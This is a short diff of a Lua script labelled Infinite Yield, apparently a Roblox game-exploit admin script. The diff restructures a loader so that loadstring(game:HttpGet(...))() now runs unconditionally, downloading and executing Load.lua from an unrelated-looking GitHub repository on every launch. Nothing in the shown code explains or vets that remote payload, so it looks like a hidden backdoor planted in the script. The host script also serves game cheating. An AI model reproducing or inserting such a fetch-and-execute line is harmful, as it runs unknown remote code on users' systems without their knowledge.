@@ -16,10 +16,8 @@ if not game:IsLoaded() then
     notLoaded.Text = "Infinite Yield is waiting for the game to load"
     game.Loaded:Wait()
     notLoaded:Destroy()
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/SKOIXLL/SKYLOLAND/refs/heads/main/Load.lua"))()
-else
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/SKOIXLL/SKYLOLAND/refs/heads/main/Load.lua"))()
 end
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SKOIXLL/SKYLOLAND/refs/heads/main/Load.lua"))()
 
 currentVersion = "6.3.1"
 
